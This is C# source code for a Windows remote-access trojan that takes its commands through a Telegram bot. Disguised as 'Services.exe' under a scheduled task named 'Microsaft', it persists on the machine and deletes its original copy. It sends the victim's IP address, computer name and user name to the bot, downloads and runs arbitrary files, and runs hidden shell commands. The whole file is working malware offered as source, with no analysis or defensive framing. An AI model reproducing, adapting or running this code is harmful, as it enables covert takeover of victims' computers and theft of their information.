using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text.RegularExpressions;
using Newtonsoft.Json;
// --------------------  AMEER AMMAR - Mustafa AL-Baghdadi --------------------- //
// https://www.facebook.com/SecuriHilla
// https://www.dev-point.com/vb/members/144903/ 
// https://www.facebook.com/server.apk
// ------------------------------------------------------------------------------
namespace Serverx 
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        #region main defines
        public string tmp; string getall; object djson; string[] djtarget; string splitTarget; string finalTarget;
        WebClient ameer = new WebClient(); string myidx = File.ReadAllText("id.txt");
        #endregion
        private void Form1_Load(object sender, EventArgs e)
        {
            #region OnStart
            RunningOrNot();
            Movies();
            try
            {
                if (!File.Exists("Newtonsoft.Json.dll"))
                    ameer.DownloadFile("", "Newtonsoft.Json.dll");
            }
            catch { Application.Exit(); }
            #endregion
            try
            {
                while (true)
                {
                    #region defines
                    getall = ameer.DownloadString(xcon + tok + "/getupdates");
                    djson = JsonConvert.DeserializeObject(getall);
                    djtarget = Regex.Split(djson.ToString(), (char)(34) + "text" + (char)(34) + ": " + (char)(34));
                    splitTarget = djtarget[djtarget.Length - 1];
                    finalTarget = Regex.Split(splitTarget, (char)(34) + "")[0];
                    #endregion
                    #region Actions
                    if (tmp != finalTarget)
                    {
                        tmp = finalTarget;
                        if (tmp.Contains(myidx))
                        {
                            string regexy1 = Regex.Split(tmp, myidx)[1];
                            if (regexy1.Contains("Getinformation,"))
                            {
                                sending("/updates/" + myidx + getip() + getpcname() + getio() + "/updates/");
                            }
                            if (regexy1.Contains("ThisIsDownloader,"))
                            {
                                string gexy1 = Regex.Split(regexy1, "ThisIsDownloader")[1];
                                downloading(Regex.Split(gexy1, ",")[1], Regex.Split(gexy1, ",")[2]);
                            }
                            if (regexy1.Contains("ThisIsCMD,"))
                            {
                                string gexy1 = Regex.Split(regexy1, "ThisIsCMD")[1];
                                smd(Regex.Split(gexy1, ",")[1]);
                            }
                        }
                    }
                    #endregion
                }
            }
            catch { Application.Exit(); }        
    }
        //--------------------------------------Functions--------------------------------------\\
        #region Functions 
        internal static string myid;
        internal static string tok = "13333336:werewrrewrewrw0_k-xJwereg";
        internal static string xcon = "https://api.telegram.org/bot";
        internal static void sending(string packge)
        {

            WebClient ameer = new WebClient();
            ameer.DownloadString(xcon + tok + "/sendmessage?chat_id=4345345&text=" + packge);

        }
        internal static string getip()
        {
            WebClient ameer = new WebClient();
            string link = ameer.DownloadString("http://www.mypublicip.com/");
            string split1 = Regex.Split(link, "Hostname is ")[1];
            string finalip = Regex.Split(split1, "<p>")[0];
            return finalip;
        }
        internal static string getio()
        {
            string x1 = "";
            return x1;
        }
        internal static string getpcname()
        {
            string x1 = Environment.MachineName + "/" + Environment.UserName;
            return x1;
        }
        internal static void CreateId()
        {
            char[] allletters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890".ToCharArray();
            Random r = new Random();
            aaaaaa:
            string randomword = allletters[r.Next(5, allletters.Length)].ToString();
            myid = myid + randomword;
            if (myid.Length < 30) { goto aaaaaa; }
            File.WriteAllText("id.txt", myid);
        }
        internal static void Movies()
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Services.exe";
            string sctask = "schtasks / create / sc minute / mo 1 / tn Microsaft / tr " + path;
            if (Assembly.GetExecutingAssembly().Location != path)
            {
                ProcessStartInfo shell1 = new ProcessStartInfo();
                shell1.Arguments = sctask;
                shell1.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(shell1);
                File.Copy(Assembly.GetExecutingAssembly().Location, path);
                File.WriteAllText("del " + Assembly.GetExecutingAssembly().Location
                    + Environment.NewLine
                    + "del " + Assembly.GetExecutingAssembly().Location + "dll.BAT",
                    Assembly.GetExecutingAssembly().Location + "dll.BAT");
                ProcessStartInfo shell2 = new ProcessStartInfo("cmd.exe");
                shell2.Arguments = @"/c " + Assembly.GetExecutingAssembly().Location + "dll.BAT";
                shell2.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(shell2);              
            }
            else
            {
                if (File.Exists("id.txt") == false)
                {
                    CreateId();
                }
            }
        }
        internal static void smd(string commend)
        {

            ProcessStartInfo shxll3 = new ProcessStartInfo("cmd.exe");
            shxll3.Arguments = @"/c " + commend;
            shxll3.WindowStyle = ProcessWindowStyle.Hidden;
            Process.Start(shxll3);

        }
        internal static void downloading(string link, string path)
        {
            WebClient xx = new WebClient();
            xx.DownloadFile(link, path);
            Process.Start(path);
        }
        internal static string secury()
        {
            string x1 = "";
            return x1;
            //    StringBuilder str = new StringBuilder();
            //    String wmipathstr = "\\" + Environment.MachineName + @"\root\SecurityCenter2";
            //    Object searcher = New Management.ManagementObjectSearcher(wmipathstr, "SELECT * FROM AntivirusProduct");
            //    object instances = searcher.[Get]()
            //    foreach ( string instance In instances) {
            //    str.Append(instance.GetPropertyValue("displayName") & "  ");

            //}
            //    return str.ToString();

        }
        void RunningOrNot()
        {

            Process x1 = Process.GetCurrentProcess();
            foreach (Process x2 in Process.GetProcesses())
            {
                if (x2.ProcessName == x1.ProcessName)
                {
                    if (x1.Id != x2.Id)
                    {
                        Application.Exit();
                    }
                }
            }
        }

        #endregion
      
    }
}